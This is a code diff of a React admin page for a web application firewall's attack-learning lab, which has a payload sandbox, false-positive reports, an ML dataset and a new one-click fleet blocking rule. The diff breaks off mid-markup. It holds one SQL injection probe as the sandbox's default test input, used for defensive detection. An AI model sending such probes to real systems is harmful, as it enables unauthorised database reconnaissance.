@@ -1,12 +1,44 @@
 import { useState, useEffect } from 'react'
+import { Link } from 'react-router-dom'
+import {
+  Brain,
+  ShieldCheck,
+  ShieldAlert,
+  AlertTriangle,
+  CheckCircle2,
+  RotateCw,
+  Search,
+  Plus,
+  Trash2,
+  Play,
+  CheckSquare,
+  Code,
+  Sparkles,
+  Filter,
+  ArrowRight,
+  FlaskConical,
+  Database,
+  Inbox,
+  Shield,
+  Zap,
+  Cpu,
+  Layers,
+  Copy,
+  Check,
+  X,
+  FileCode,
+  ExternalLink,
+  Clock
+} from 'lucide-react'
 import api from '../api/api'
 import adminStore from '../utils/adminStore'
+import { copyToClipboard } from '../utils/clipboard'
 
 export default function AttackLearning() {
   const cachedStats = adminStore.get('learning_stats')
   const [stats, setStats] = useState(cachedStats)
   const [loading, setLoading] = useState(!cachedStats)
-  const [activeTab, setActiveTab] = useState('reports') // 'reports' | 'sandbox' | 'dataset' | 'whitelists'
+  const [activeTab, setActiveTab] = useState('sandbox') // 'sandbox' | 'reports' | 'dataset'
 
   // Reports state
   const [reports, setReports] = useState([])
@@ -19,10 +51,6 @@ export default function AttackLearning() {
   const [samplesFilter, setSamplesFilter] = useState('all')
   const [samplesSearch, setSamplesSearch] = useState('')
   const [samplesLoading, setSamplesLoading] = useState(false)
-
-  // Whitelists state
-  const [whitelists, setWhitelists] = useState([])
-  const [whitelistsLoading, setWhitelistsLoading] = useState(false)
 
   // Sandbox state
   const [sandboxPayload, setSandboxPayload] = useState("UNION SELECT 1, @@version, user() --")
@@ -44,10 +72,17 @@ export default function AttackLearning() {
 
   const [retraining, setRetraining] = useState(false)
   const [notification, setNotification] = useState(null)
+  const [copiedId, setCopiedId] = useState(null)
 
   const showNotification = (msg, type = 'success') => {
     setNotification({ msg, type })
     setTimeout(() => setNotification(null), 4500)
+  }
+
+  const handleCopy = (id, text) => {
+    copyToClipboard(text)
+    setCopiedId(id)
+    setTimeout(() => setCopiedId(null), 1800)
   }
 
   // Fetch metrics & initial tab data
@@ -96,18 +131,6 @@ export default function AttackLearning() {
     }
   }
 
-  const loadWhitelists = async () => {
-    setWhitelistsLoading(true)
-    try {
-      const res = await api.adminGetLearningWhitelists()
-      setWhitelists(res.data?.whitelists || [])
-    } catch (err) {
-      showNotification("Failed to fetch whitelists", "error")
-    } finally {
-      setWhitelistsLoading(false)
-    }
-  }
-
   useEffect(() => {
     loadStats(!adminStore.get('learning_stats'))
   }, [])
@@ -115,10 +138,35 @@ export default function AttackLearning() {
   useEffect(() => {
     if (activeTab === 'reports') loadReports()
     if (activeTab === 'dataset') loadSamples()
-    if (activeTab === 'whitelists') loadWhitelists()
   }, [activeTab, reportsFilter, samplesFilter])
 
   // ==================== ACTIONS ====================
+
+  const handleDeployFleetAttackRule = async (payload, ruleName) => {
+    if (!payload) return
+    try {
+      const cleanPattern = payload.length < 50 
+        ? `(?i)(${payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`
+        : `(?i)(${payload.slice(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`
+      
+      await api.adminCreateVirtualPatch({
+        rule_type: 'custom_rule',
+        cve_id: `RULE-RAPID-${Math.floor(1000 + Math.random() * 9000)}`,
+        name: ruleName || `Rapid Blocker for ${payload.slice(0, 30)}...`,
+        category: sandboxResult?.attack_type || 'Custom Attack',
+        component: 'fleet-waf',
+        target_scope: 'all',
+        pattern: cleanPattern,
+        action: 'block',
+        severity: 'critical',
+        is_active: true
+      })
+      showNotification("Fleet Attack Rule deployed and synchronized across all sites!", "success")
+      loadStats()
+    } catch (err) {
+      showNotification(err.message || "Failed to deploy fleet rule", "error")
+    }
+  }
 
   const handleOpenWhitelistModal = (report = null, defaultPattern = '') => {
     setSelectedReport(report)
@@ -137,11 +185,10 @@ export default function AttackLearning() {
     e.preventDefault()
     try {
       await api.adminWhitelistPattern(whitelistForm)
-      showNotification("Pattern whitelisted & benign ML sample recorded successfully! False-positive 403 resolved.")
+      showNotification("Pattern whitelisted & benign ML sample recorded! False-positive 403 resolved.")
       setWhitelistModalOpen(false)
       loadStats()
       if (activeTab === 'reports') loadReports()
-      if (activeTab === 'whitelists') loadWhitelists()
     } catch (err) {
       showNotification(err.message || "Failed to whitelist pattern", "error")
     }
@@ -151,7 +198,7 @@ export default function AttackLearning() {
     setSelectedReport(report)
     setBlacklistForm({
       report_id: report?.id || null,
-      name: report ? `Attack Rule: ${report.reference_id}` : 'Learned Attack Signature',
+      name: report ? `RULE-${report.reference_id}` : `RULE-ATTACK-${Math.floor(1000 + Math.random() * 9000)}`,
       pattern: defaultPayload || report?.payload || '',
       category: report?.attack_type || 'SQL Injection',
       severity: 'critical',
@@ -246,18 +293,6 @@ export default function AttackLearning() {
     }
   }
 
-  const handleDeleteWhitelist = async (id) => {
-    if (!window.confirm("Remove this whitelist rule?")) return
-    try {
-      await api.adminDeleteLearningWhitelist(id)
-      showNotification("Whitelist rule deleted")
-      loadWhitelists()
-      loadStats()
-    } catch (err) {
-      showNotification("Failed to delete whitelist rule", "error")
-    }
-  }
-
   const sendToSandbox = (payload, url = '/') => {
     setSandboxPayload(payload)
     setSandboxUrl(url)
@@ -268,309 +303,400 @@ export default function AttackLearning() {
   }
 
   return (
-    <>
-      {/* Floating Notification */}
+    <div style={{ maxWidth: '100%', boxSizing: 'border-box' }}>
+      {/* Toast Alert */}
       {notification && (
         <div style={{
           position: 'fixed',
-          top: '24px',
+          bottom: '24px',
           right: '24px',
           zIndex: 9999,
-          background: notification.type === 'error' ? '#ef4444' : '#10b981',
-          color: '#ffffff',
-          padding: '12px 20px',
+          background: notification.type === 'error' ? '#DC2626' : '#0F172A',
+          color: '#FFFFFF',
+          padding: '10px 18px',
           borderRadius: '8px',
-          boxShadow: '0 8px 24px rgba(0,0,0,0.15)',
+          boxShadow: '0 10px 25px -5px rgba(0,0,0,0.2)',
+          fontSize: '12.5px',
           fontWeight: '600',
           display: 'flex',
           alignItems: 'center',
-          gap: '10px'
+          gap: '8px'
         }}>
-          <i className={`fas ${notification.type === 'error' ? 'fa-circle-exclamation' : 'fa-circle-check'}`}></i>
-          {notification.msg}
+          {notification.type === 'error' ? <AlertTriangle size={15} /> : <CheckCircle2 size={15} color="#34D399" />}
+          <span>{notification.msg}</span>
         </div>
       )}
 
-      {/* Header Bar */}
+      {/* TOP HEADER STRIP — Compact & Clean (100% Logs.jsx Match) */}
       <div style={{
-        background: 'white',
-        borderRadius: '12px',
-        border: '1px solid #e2e8f0',
-        padding: '16px 20px',
-        marginBottom: '20px',
+        background: '#FFFFFF',
+        borderRadius: '10px',
+        border: '1px solid #D9E1DC',
+        padding: '10px 16px',
+        marginBottom: '10px',
         display: 'flex',
         justifyContent: 'space-between',
         alignItems: 'center',
         flexWrap: 'wrap',
-        gap: '14px',
-        boxShadow: '0 1px 3px rgba(0,0,0,0.03)'
+        gap: '10px'
       }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
-          <div style={{
-            width: '42px',
-            height: '42px',
-            borderRadius: '10px',
-            background: 'linear-gradient(135deg, #f3e8ff, #e9d5ff)',
-            color: '#7c3aed',
-            display: 'flex',
+        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+          <span style={{
+            fontSize: '11px',
+            fontWeight: '700',
+            letterSpacing: '0.04em',
+            textTransform: 'uppercase',
+            color: '#2563EB',
+            background: '#EFF6FF',
+            border: '1px solid #DBEAFE',
+            padding: '3px 10px',
+            borderRadius: '20px',
+            display: 'inline-flex',
             alignItems: 'center',
-            justifyContent: 'center',
-            fontSize: '19px'
+            gap: '6px'
           }}>
-            <i className="fas fa-brain"></i>
-          </div>
-          <div>
-            <h1 style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a', margin: 0 }}>
-              Attack Learning Lab & AI Model Center
-            </h1>
-            <p style={{ color: '#64748b', fontSize: '12.5px', margin: '3px 0 0' }}>
-              Resolve 403 false positives via 1-click whitelisting, capture emerging threat signatures, and fine-tune ML models.
-            </p>
-          </div>
+            <Brain size={12} />
+            <span>AI Model Center</span>
+          </span>
+          <span style={{ fontSize: '13px', fontWeight: '700', color: '#10201E' }}>
+            Attack Evasion Lab &amp; Continuous Learning
+          </span>
         </div>
 
-        <div style={{ display: 'flex', gap: '10px' }}>
-          <button
-            type="button"
-            className="btn-primary"
-            onClick={handleRetrainModel}
-            disabled={retraining}
+        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+          <Link
+            to="/admin/rules"
             style={{
-              padding: '8px 18px',
+              padding: '6px 14px',
+              borderRadius: '6px',
+              background: '#EFF6FF',
+              border: '1px solid #BFDBFE',
+              color: '#1D4ED8',
               fontSize: '12.5px',
-              fontWeight: '600',
+              fontWeight: '700',
               display: 'inline-flex',
               alignItems: 'center',
               gap: '6px',
-              background: '#7c3aed'
+              textDecoration: 'none'
             }}
           >
-            <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i>
-            {retraining ? 'Fine-Tuning ML Model...' : 'Retrain WAF Model Now'}
+            <Shield size={13} />
+            <span>View Fleet Rules & Patches ↗</span>
+          </Link>
+
+          <button
+            type="button"
+            onClick={handleRetrainModel}
+            disabled={retraining}
+            style={{
+              padding: '6px 14px',
+              borderRadius: '6px',
+              background: '#2563EB',
+              border: '1px solid #1D4ED8',
+              color: '#FFFFFF',
+              fontSize: '12.5px',
+              fontWeight: '700',
+              cursor: retraining ? 'not-allowed' : 'pointer',
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: '6px'
+            }}
+          >
+            <RotateCw size={13} className={retraining ? 'animate-spin' : ''} />
+            <span>{retraining ? 'Fine-Tuning ML Model...' : 'Retrain WAF Model Now'}</span>
           </button>
         </div>
       </div>
 
-      {/* Stat Cards Grid */}
-      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px', marginBottom: '20px' }}>
-        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-            Pending User Reports
+      {/* COMPACT KPI CARDS (100% Logs.jsx Match) */}
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))', gap: '8px', marginBottom: '14px' }}>
+        <div style={{
+          background: '#FFFFFF',
+          borderRadius: '8px',
+          border: '1px solid #D9E1DC',
+          padding: '8px 12px',
+          display: 'flex',
+          alignItems: 'center',
+          gap: '10px',
+          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
+        }}>
+          <div style={{
+            width: '24px',
+            height: '24px',
+            borderRadius: '6px',
+            background: '#FBFCFA',
+            border: '1px solid #D9E1DC',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            flexShrink: 0
+          }}>
+            <Inbox size={13} color="#D97706" />
           </div>
-          <div style={{ fontSize: '26px', fontWeight: '800', color: '#d97706', margin: '4px 0' }}>
-            {stats?.reports?.pending || 0}
+          <div>
+            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
+              Pending Reports
+            </div>
+            <div style={{ fontSize: '17px', fontWeight: '700', color: '#D97706', lineHeight: '1.1', marginTop: '1px' }}>
+              {stats?.reports?.pending || 0}
+            </div>
           </div>
-          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Total Feedback: {stats?.reports?.total || 0}</div>
         </div>
 
-        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-            Learned Attack Rules
+        <div style={{
+          background: '#FFFFFF',
+          borderRadius: '8px',
+          border: '1px solid #D9E1DC',
+          padding: '8px 12px',
+          display: 'flex',
+          alignItems: 'center',
+          gap: '10px',
+          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
+        }}>
+          <div style={{
+            width: '24px',
+            height: '24px',
+            borderRadius: '6px',
+            background: '#FBFCFA',
+            border: '1px solid #D9E1DC',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            flexShrink: 0
+          }}>
+            <ShieldAlert size={13} color="#DC2626" />
           </div>
-          <div style={{ fontSize: '26px', fontWeight: '800', color: '#dc2626', margin: '4px 0' }}>
-            {stats?.rules?.learned_blocking_rules || 0}
+          <div>
+            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
+              Learned Attack Rules
+            </div>
+            <div style={{ fontSize: '17px', fontWeight: '700', color: '#DC2626', lineHeight: '1.1', marginTop: '1px' }}>
+              {stats?.rules?.learned_blocking_rules || 0}
+            </div>
           </div>
-          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Dynamic Signature Blocks</div>
         </div>
 
-        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-            Active Whitelists (Fix 403)
+        <div style={{
+          background: '#FFFFFF',
+          borderRadius: '8px',
+          border: '1px solid #D9E1DC',
+          padding: '8px 12px',
+          display: 'flex',
+          alignItems: 'center',
+          gap: '10px',
+          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
+        }}>
+          <div style={{
+            width: '24px',
+            height: '24px',
+            borderRadius: '6px',
+            background: '#FBFCFA',
+            border: '1px solid #D9E1DC',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            flexShrink: 0
+          }}>
+            <Database size={13} color="#059669" />
           </div>
-          <div style={{ fontSize: '26px', fontWeight: '800', color: '#16a34a', margin: '4px 0' }}>
-            {stats?.rules?.active_whitelists || 0}
+          <div>
+            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
+              ML Dataset Samples
+            </div>
+            <div style={{ fontSize: '17px', fontWeight: '700', color: '#059669', lineHeight: '1.1', marginTop: '1px' }}>
+              {stats?.dataset?.total_samples || samples.length || 0}
+            </div>
           </div>
-          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Safe Route Exceptions</div>
         </div>
 
-        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-            WAF ML Model Version
+        <div style={{
+          background: '#FFFFFF',
+          borderRadius: '8px',
+          border: '1px solid #D9E1DC',
+          padding: '8px 12px',
+          display: 'flex',
+          alignItems: 'center',
+          gap: '10px',
+          boxShadow: '0 1px 3px rgba(11, 37, 34, 0.02)'
+        }}>
+          <div style={{
+            width: '24px',
+            height: '24px',
+            borderRadius: '6px',
+            background: '#FBFCFA',
+            border: '1px solid #D9E1DC',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            flexShrink: 0
+          }}>
+            <Cpu size={13} color="#2563EB" />
           </div>
-          <div style={{ fontSize: '26px', fontWeight: '800', color: '#7c3aed', margin: '4px 0' }}>
-            v{stats?.model_status?.model_version || '2.4.0'}
-          </div>
-          <div style={{ fontSize: '12px', color: '#94a3b8' }}>
-            {stats?.dataset?.untrained_samples || 0} queued samples ready
+          <div>
+            <div style={{ fontSize: '10.5px', fontWeight: '700', color: '#60716B', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
+              WAF ML Model Version
+            </div>
+            <div style={{ fontSize: '17px', fontWeight: '700', color: '#10201E', lineHeight: '1.1', marginTop: '1px' }}>
+              v{stats?.model_status?.model_version || '2.4.0'}
+            </div>
           </div>
         </div>
       </div>
 
-      {/* Interactive 4-Section Architecture & Workflow Guide */}
+      {/* 3-STEP ADAPTIVE PIPELINE GUIDE */}
       <div style={{
-        background: 'linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%)',
-        border: '1px solid #e2e8f0',
-        borderRadius: '12px',
-        padding: '16px 20px',
-        marginBottom: '20px',
-        boxShadow: '0 1px 3px rgba(0,0,0,0.02)'
+        background: '#FFFFFF',
+        border: '1px solid #D9E1DC',
+        borderRadius: '10px',
+        padding: '12px 16px',
+        marginBottom: '16px'
       }}>
-        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '12px', flexWrap: 'wrap', gap: '8px' }}>
+        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
           <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-            <i className="fas fa-lightbulb" style={{ color: '#d97706', fontSize: '16px' }}></i>
-            <h4 style={{ margin: 0, fontSize: '14px', fontWeight: '700', color: '#0f172a' }}>
-              How the 4 Attack Learning Modules Work Together
+            <Sparkles size={14} style={{ color: '#2563EB' }} />
+            <h4 style={{ margin: 0, fontSize: '13px', fontWeight: '700', color: '#0F172A' }}>
+              Continuous Adaptive Security Pipeline (Threat Simulation & AI Studio)
             </h4>
           </div>
-          <span style={{ fontSize: '12px', color: '#64748b' }}>Continuous Adaptive Security Loop</span>
+          <span style={{ fontSize: '11.5px', color: '#64748B' }}>Real-time evaluation &amp; zero-downtime retraining</span>
         </div>
 
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '12px' }}>
+        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '8px' }}>
           <div
-            onClick={() => setActiveTab('reports')}
+            onClick={() => setActiveTab('sandbox')}
             style={{
-              background: activeTab === 'reports' ? '#eff6ff' : 'white',
-              border: '1px solid ' + (activeTab === 'reports' ? '#93c5fd' : '#e2e8f0'),
+              background: activeTab === 'sandbox' ? '#EFF6FF' : '#FBFCFA',
+              border: '1px solid ' + (activeTab === 'sandbox' ? '#93C5FD' : '#D9E1DC'),
               borderRadius: '8px',
-              padding: '12px 14px',
+              padding: '10px 12px',
               cursor: 'pointer',
-              transition: 'all 0.15s'
+              transition: 'all 0.15s ease'
             }}
           >
-            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
-              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#dbeafe', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>1</span>
-              <strong style={{ fontSize: '13px', color: '#1e40af' }}>False-Positive Inbox</strong>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
+              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>1</span>
+              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>Interactive Attack Sandbox &amp; Rapid Blocker</strong>
             </div>
-            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
-              When a user reports a blocked legitimate request (403), review and click <strong>1-Click Whitelist</strong> to instantly fix it.
+            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
+              Simulate zero-day attacks live against AST, ML, and Rules. 1-Click deploy fleet blocking rules instantly.
             </p>
           </div>
 
           <div
-            onClick={() => setActiveTab('sandbox')}
+            onClick={() => setActiveTab('reports')}
             style={{
-              background: activeTab === 'sandbox' ? '#faf5ff' : 'white',
-              border: '1px solid ' + (activeTab === 'sandbox' ? '#d8b4fe' : '#e2e8f0'),
+              background: activeTab === 'reports' ? '#EFF6FF' : '#FBFCFA',
+              border: '1px solid ' + (activeTab === 'reports' ? '#93C5FD' : '#D9E1DC'),
               borderRadius: '8px',
-              padding: '12px 14px',
+              padding: '10px 12px',
               cursor: 'pointer',
-              transition: 'all 0.15s'
+              transition: 'all 0.15s ease'
             }}
           >
-            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
-              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#f3e8ff', color: '#7c3aed', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>2</span>
-              <strong style={{ fontSize: '13px', color: '#6b21a8' }}>Interactive Sandbox</strong>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
+              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>2</span>
+              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>User 403 Feedback &amp; False-Positive Ingestion</strong>
             </div>
-            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
-              Test any suspicious URL, query, or SQLi/XSS payload live to inspect AST, Regex, and Neural ML scores.
+            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
+              Review blocked requests reported by legitimate users. Click <strong>1-Click Whitelist</strong> to resolve.
             </p>
           </div>
 
           <div
             onClick={() => setActiveTab('dataset')}
             style={{
-              background: activeTab === 'dataset' ? '#f0fdf4' : 'white',
-              border: '1px solid ' + (activeTab === 'dataset' ? '#86efac' : '#e2e8f0'),
+              background: activeTab === 'dataset' ? '#EFF6FF' : '#FBFCFA',
+              border: '1px solid ' + (activeTab === 'dataset' ? '#93C5FD' : '#D9E1DC'),
               borderRadius: '8px',
-              padding: '12px 14px',
+              padding: '10px 12px',
               cursor: 'pointer',
-              transition: 'all 0.15s'
+              transition: 'all 0.15s ease'
             }}
           >
-            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
-              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#dcfce7', color: '#16a34a', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>3</span>
-              <strong style={{ fontSize: '13px', color: '#15803d' }}>ML Active Dataset</strong>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '3px' }}>
+              <span style={{ width: '18px', height: '18px', borderRadius: '50%', background: '#DBEAFE', color: '#1D4ED8', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: '800' }}>3</span>
+              <strong style={{ fontSize: '12px', color: '#1E40AF' }}>ML Training Dataset &amp; AI Fine-Tuning</strong>
             </div>
-            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
-              Stores labeled Safe (0) vs Attack (1) samples. Click <strong>Retrain Model Now</strong> to continuously fine-tune the AI.
-            </p>
-          </div>
-
-          <div
-            onClick={() => setActiveTab('whitelists')}
-            style={{
-              background: activeTab === 'whitelists' ? '#fff7ed' : 'white',
-              border: '1px solid ' + (activeTab === 'whitelists' ? '#fed7aa' : '#e2e8f0'),
-              borderRadius: '8px',
-              padding: '12px 14px',
-              cursor: 'pointer',
-              transition: 'all 0.15s'
-            }}
-          >
-            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
-              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#ffedd5', color: '#c2410c', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>4</span>
-              <strong style={{ fontSize: '13px', color: '#9a3412' }}>Active Whitelist Rules</strong>
-            </div>
-            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
-              Permanent exception rules (paths, APIs, webhooks) that are guaranteed never to trigger a 403 block.
+            <p style={{ margin: 0, fontSize: '11px', color: '#475569', lineHeight: '1.35' }}>
+              Curated corpus of Safe (0) vs Attack (1) samples. Click <strong>Retrain Model Now</strong> to fine-tune AI.
             </p>
           </div>
         </div>
       </div>
 
-      {/* Tabs Navigation */}
+      {/* TABS NAVIGATION BAR */}
       <div style={{
-        background: 'white',
-        borderRadius: '12px',
-        border: '1px solid #e2e8f0',
-        padding: '6px',
-        marginBottom: '20px',
         display: 'flex',
         gap: '6px',
-        flexWrap: 'wrap',
-        boxShadow: '0 1px 3px rgba(0,0,0,0.03)'
+        marginBottom: '16px',
+        borderBottom: '1px solid #D9E1DC',
+        paddingBottom: '2px'
       }}>
         {[
-          { id: 'reports', label: 'User Reports & Feedback', icon: 'fa-inbox', badge: stats?.reports?.pending },
-          { id: 'sandbox', label: 'Interactive Attack Sandbox', icon: 'fa-flask' },
-          { id: 'dataset', label: `ML Training Dataset (${stats?.dataset?.total_samples || 0})`, icon: 'fa-database' },
-          { id: 'whitelists', label: `Whitelist Rules (${stats?.rules?.active_whitelists || 0})`, icon: 'fa-shield-heart' }
-        ].map(tab => (
-          <button
-            key={tab.id}
-            type="button"
-            onClick={() => setActiveTab(tab.id)}
-            style={{
-              padding: '9px 16px',
-              borderRadius: '8px',
-              border: 'none',
-              background: activeTab === tab.id ? '#7c3aed' : 'transparent',
-              color: activeTab === tab.id ? 'white' : '#64748b',
-              fontWeight: '600',
-              fontSize: '13px',
-              cursor: 'pointer',
-              display: 'inline-flex',
-              alignItems: 'center',
-              gap: '8px',
-              transition: 'all 0.15s'
-            }}
-          >
-            <i className={`fas ${tab.icon}`}></i>
-            {tab.label}
-            {tab.badge > 0 && (
-              <span style={{
-                background: activeTab === tab.id ? 'white' : '#d97706',
-                color: activeTab === tab.id ? '#7c3aed' : 'white',
-                padding: '1px 6px',
-                borderRadius: '10px',
-                fontSize: '11px',
-                fontWeight: '700'
-              }}>
-                {tab.badge}
-              </span>
-            )}
-          </button>
-        ))}
+          { id: 'sandbox', label: 'Interactive Attack Sandbox & Rapid Blocker', icon: FlaskConical },
+          { id: 'reports', label: 'User False-Positive Reports', icon: Inbox, badge: stats?.reports?.pending },
+          { id: 'dataset', label: `ML Training Dataset (${stats?.dataset?.total_samples || samples.length || 0})`, icon: Database }
+        ].map(tab => {
+          const Icon = tab.icon
+          const isActive = activeTab === tab.id
+          return (
+            <button
+              key={tab.id}
+              type="button"
+              onClick={() => setActiveTab(tab.id)}
+              style={{
+                padding: '9px 16px',
+                borderRadius: '8px 8px 0 0',
+                border: 'none',
+                background: isActive ? '#FFFFFF' : 'transparent',
+                color: isActive ? '#2563EB' : '#64748B',
+                fontWeight: '700',
+                fontSize: '13px',
+                cursor: 'pointer',
+                borderBottom: isActive ? '2.5px solid #2563EB' : '2.5px solid transparent',
+                display: 'inline-flex',
+                alignItems: 'center',
+                gap: '8px'
+              }}
+            >
+              <Icon size={14} />
+              <span>{tab.label}</span>
+              {tab.badge > 0 && (
+                <span style={{
+                  background: isActive ? '#EFF6FF' : '#FEF3C7',
+                  color: isActive ? '#1D4ED8' : '#B45309',
+                  border: isActive ? '1px solid #DBEAFE' : '1px solid #FDE68A',
+                  padding: '1px 6px',
+                  borderRadius: '10px',
+                  fontSize: '10.5px',
+                  fontWeight: '800'
+                }}>
+                  {tab.badge}
+                </span>
+              )}
+            </button>
+          )
+        })}
       </div>
 
       {/* ==================== TAB 1: REPORTS & FEEDBACK ==================== */}
       {activeTab === 'reports' && (
-        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
+        <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', overflow: 'hidden' }}>
           {/* Controls Bar */}
-          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', gap: '14px', flexWrap: 'wrap' }}>
-            <div style={{ display: 'flex', gap: '8px' }}>
+          <div style={{ padding: '12px 16px', borderBottom: '1px solid #D9E1DC', background: '#FBFCFA', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
+            <div style={{ display: 'flex', gap: '6px' }}>
               {['all', 'pending', 'whitelisted', 'blacklisted'].map(st => (
                 <button
                   key={st}
                   onClick={() => setReportsFilter(st)}
                   style={{
-                    padding: '6px 14px',
-                    borderRadius: '8px',
-                    border: '1px solid ' + (reportsFilter === st ? '#7c3aed' : '#e2e8f0'),
-                    background: reportsFilter === st ? '#f5f3ff' : '#f8fafc',
-                    color: reportsFilter === st ? '#7c3aed' : '#475569',
-                    fontWeight: '600',
-                    fontSize: '12.5px',
+                    padding: '5px 12px',
+                    borderRadius: '6px',
+                    border: '1px solid ' + (reportsFilter === st ? '#93C5FD' : '#D9E1DC'),
+                    background: reportsFilter === st ? '#EFF6FF' : '#FFFFFF',
+                    color: reportsFilter === st ? '#1D4ED8' : '#60716B',
+                    fontWeight: '700',
+                    fontSize: '11.5px',
                     cursor: 'pointer',
                     textTransform: 'capitalize'
                   }}
@@ -580,112 +706,120 @@ export default function AttackLearning() {
               ))}
             </div>
 
-            <div style={{ display: 'flex', gap: '8px', flex: '1 1 280px', maxWidth: '400px' }}>
-              <input
-                type="text"
-                placeholder="Search reference, IP, URL, payload..."
-                value={reportsSearch}
-                onChange={e => setReportsSearch(e.target.value)}
-                onKeyDown={e => e.key === 'Enter' && loadReports()}
-                style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
-              />
+            <div style={{ display: 'flex', gap: '6px', flex: '1 1 260px', maxWidth: '360px' }}>
+              <div style={{ position: 'relative', width: '100%' }}>
